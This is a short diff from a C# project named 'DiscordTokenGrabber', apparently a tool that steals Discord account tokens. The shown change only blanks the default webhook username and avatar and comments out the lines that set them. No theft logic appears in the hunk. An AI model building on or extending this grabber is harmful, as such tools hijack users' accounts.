@@ -42,13 +42,13 @@ namespace DiscordTokenGrabber
 
     internal class DiscordMessageAPI
     {
-        public static DiscordMessageStructure CreateMessage(string _message, string _username = "Asuna", string _avatar_url = "https://www.kindpng.com/picc/b/88-883023_sword-art-online-asuna-yuuki-hyper-accion-hd.png")
+        public static DiscordMessageStructure CreateMessage(string _message, string _username = "", string _avatar_url = "")
         {
             DiscordMessageStructure _discordMessageStruct = new DiscordMessageStructure();
 
             _discordMessageStruct.content = _message;
-            _discordMessageStruct.username = _username;
-            _discordMessageStruct.avatar_url = _avatar_url;
+            //_discordMessageStruct.username = _username;
+            //_discordMessageStruct.avatar_url = _avatar_url;
 
             return _discordMessageStruct;
         }
